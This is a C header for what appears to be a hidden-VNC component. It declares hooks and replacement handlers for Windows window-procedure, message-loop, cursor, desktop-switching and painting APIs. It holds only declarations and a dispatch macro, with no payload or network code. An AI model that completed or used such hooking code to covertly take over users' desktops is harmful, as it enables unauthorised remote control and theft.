#ifndef VNCTHREAD_H_INCLUDED
#define VNCTHREAD_H_INCLUDED

#define DEFPROC_PROLOG(hWnd) if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))\
                             {\
                                DWORD tmp=__LINE__;\
                                if (uMsg == lpServer->lpGlobalVNCData->dwVNCMessage)\
                                    return HandleVNCMsg(hWnd,wParam,lParam);\
                                else if ((bShell) && ((hWnd == lpServer->WndsInfo.hDefView) || (hWnd == lpServer->WndsInfo.hDeskListView)) && (uMsg == WM_ERASEBKGND))\
                                    return EraseBkg(hWnd,wParam);\
                                else if ((uMsg == WM_NCACTIVATE) && (wParam))\
                                    return 0;\
                             }
extern bool bShell;
void HandleWM_PRINT(HWND hWnd);
extern HBRUSH hBkgBrush;

LRESULT HandleVNCMsg(HWND hWnd,WPARAM wParam,LPARAM lParam);
LRESULT EraseBkg(HWND hWnd,WPARAM wParam);
void FixMessage(BOOL r,LPMSG Msg);

#define FixMsg(r,Msg) DWORD tmp=__LINE__;\
                      FixMessage(r,Msg);

typedef LRESULT WINAPI __DefWindowProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefWindowProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefDlgProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefDlgProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefFrameProcW(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefFrameProcA(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefMDIChildProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __DefMDIChildProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __CallWindowProcW(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
typedef LRESULT WINAPI __CallWindowProcA(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);

typedef BOOL WINAPI __GetCursorPos(LPPOINT lpPoint);
typedef BOOL WINAPI __SetCursorPos(int X,int Y);
typedef DWORD WINAPI __GetMessagePos(VOID);
typedef HWND WINAPI __SetCapture(HWND hWnd);
typedef BOOL WINAPI __ReleaseCapture(VOID);
typedef HWND WINAPI __GetCapture(void);
typedef BOOL WINAPI __GetMessageW(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
typedef BOOL WINAPI __GetMessageA(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
typedef BOOL WINAPI __PeekMessageW(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
typedef BOOL WINAPI __PeekMessageA(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
typedef BOOL WINAPI __TranslateMessage(LPMSG Msg);

typedef HDESK WINAPI __OpenInputDesktop(DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
typedef BOOL WINAPI __SwitchDesktop(HDESK hDesk);

typedef HDESK WINAPI __OpenDesktopA(LPCSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
typedef HDESK WINAPI __OpenDesktopW(LPCWSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);

typedef BOOL WINAPI __FlashWindowEx(PFLASHWINFO pfwi);
typedef BOOL WINAPI __FlashWindow(HWND hWnd,BOOL bInvert);

typedef BOOL WINAPI __TrackPopupMenuEx(HMENU hmenu,UINT fuFlags,int x,int y,HWND hwnd,LPTPMPARAMS lptpm);
typedef BOOL WINAPI __ShowWindow(HWND hWnd,int nCmdShow);

typedef UINT WINAPI __GetCaretBlinkTime();

EXTERN_HOOK(DefWindowProcW)
EXTERN_HOOK(DefWindowProcA)
EXTERN_HOOK(DefDlgProcW)
EXTERN_HOOK(DefDlgProcA)
EXTERN_HOOK(DefFrameProcW)
EXTERN_HOOK(DefFrameProcA)
EXTERN_HOOK(DefMDIChildProcW)
EXTERN_HOOK(DefMDIChildProcA)
EXTERN_HOOK(CallWindowProcW)
EXTERN_HOOK(CallWindowProcA)

EXTERN_HOOK(GetCursorPos)
EXTERN_HOOK(SetCursorPos)
EXTERN_HOOK(GetMessagePos)
EXTERN_HOOK(SetCapture)
EXTERN_HOOK(ReleaseCapture)
EXTERN_HOOK(GetCapture)
EXTERN_HOOK(GetMessageW)
EXTERN_HOOK(GetMessageA)
EXTERN_HOOK(PeekMessageW)
EXTERN_HOOK(PeekMessageA)
EXTERN_HOOK(TranslateMessage)

EXTERN_HOOK(OpenInputDesktop)
EXTERN_HOOK(SwitchDesktop)

EXTERN_HOOK(OpenDesktopA)
EXTERN_HOOK(OpenDesktopW)

EXTERN_HOOK(FlashWindowEx)
EXTERN_HOOK(FlashWindow)

EXTERN_HOOK(SetDIBitsToDevice)

EXTERN_HOOK(TrackPopupMenuEx)
EXTERN_HOOK(ShowWindow)

EXTERN_HOOK(GetCaretBlinkTime)

LRESULT WINAPI DefWindowProcW_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefWindowProcA_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefDlgProcW_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefDlgProcA_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefFrameProcW_handler(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefFrameProcA_handler(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefMDIChildProcW_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI DefMDIChildProcA_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI CallWindowProcW_handler(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);
LRESULT WINAPI CallWindowProcA_handler(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam);

BOOL WINAPI GetCursorPos_handler(LPPOINT lpPoint);
BOOL WINAPI SetCursorPos_handler(int X,int Y);
DWORD WINAPI GetMessagePos_handler(VOID);
HWND WINAPI SetCapture_handler(HWND hWnd);
BOOL WINAPI ReleaseCapture_handler(VOID);
HWND WINAPI GetCapture_handler(void);
BOOL WINAPI GetMessageW_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
BOOL WINAPI GetMessageA_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax);
BOOL WINAPI PeekMessageW_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
BOOL WINAPI PeekMessageA_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg);
BOOL WINAPI TranslateMessage_handler(LPMSG Msg);

HDESK WINAPI OpenDesktopA_handler(LPCSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
HDESK WINAPI OpenDesktopW_handler(LPCWSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);

HDESK WINAPI OpenInputDesktop_handler(DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess);
BOOL WINAPI SwitchDesktop_handler(HDESK hDesk);

BOOL WINAPI FlashWindowEx_handler(PFLASHWINFO pfwi);
BOOL WINAPI FlashWindow_handler(HWND hWnd,BOOL bInvert);

UINT WINAPI GetCaretBlinkTime_handler(VOID);

struct JavaPaintHook
{
    HANDLE hMutex;
    HWND hWnd;
    HDC hDC;
    HBITMAP hBitmap;
    JavaPaintHook *next;
};

extern JavaPaintHook JavaHooks;
typedef int WINAPI __SetDIBitsToDevice(HDC hdc,int xDest,int yDest,DWORD w,DWORD h,int xSrc,int ySrc,UINT StartScan,UINT cLines,CONST VOID *lpvBits,CONST BITMAPINFO *lpbmi,UINT ColorUse);
int WINAPI SetDIBitsToDevice_handler(HDC hdc,int xDest,int yDest,DWORD w,DWORD h,int xSrc,int ySrc,UINT StartScan,UINT cLines,CONST VOID *lpvBits,CONST BITMAPINFO *lpbmi,UINT ColorUse);

BOOL WINAPI TrackPopupMenuEx_handler(HMENU hmenu,UINT fuFlags,int x,int y,HWND hwnd,LPTPMPARAMS lptpm);
BOOL WINAPI ShowWindow_handler(HWND hWnd,int nCmdShow);

#define VMR_IQOK 0xDEADC0DE

LRESULT APIENTRY SubclassProcForIdioticCodes(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

struct SUBCLASS_INFO
{
    HWND hWnd;
    LONG_PTR dwOriginal;
    SUBCLASS_INFO *lpNext;
};

void AppendSubclassedWnd(HWND hWnd,LONG_PTR dwOrig);

struct WNDS_LIST_ITEM
{
    HWND hWnd;
    WNDS_LIST_ITEM *lpNext;
};

#endif // VNCTHREAD_H_INCLUDED
